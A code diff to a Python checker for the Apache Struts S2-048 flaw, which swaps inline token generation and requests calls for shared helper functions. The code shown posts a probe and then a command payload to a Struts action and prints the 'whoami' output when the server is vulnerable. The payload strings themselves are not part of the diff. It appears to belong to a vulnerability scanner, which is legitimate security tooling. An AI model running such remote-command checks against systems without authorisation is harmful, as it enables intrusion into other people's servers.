@@ -10,20 +10,14 @@ import re
 import json
 import time
 import urllib
-import string
-import random
-import requests
 from urllib import parse
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class S2_048_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta='' 
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words) 
+        self.capta = get_capta() 
         self.headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                    'Content-Type': "application/x-www-form-urlencoded",
@@ -52,9 +46,9 @@ class S2_048_BaseVerify:
         if  '.action' not in self.url:
             self.url = self.url + '/integration/saveGangster.action'
         try:
-            check_req = requests.post(self.url, headers = self.headers, data = self.check_data)
+            check_req = request.post(self.url, headers = self.headers, data = self.check_data)
             if self.capta in check_req.text:
-                cmd_req = requests.post(self.url, headers = self.headers, data = self.cmd_data)
+                cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_data)
                 cmd_str = re.sub('\n', '', cmd_req.text)
                 result = re.findall('Gangster (.*?) added successfully', cmd_str)
                 print('存在S2-048漏洞,执行whoami命令成功，其结果为:', result)
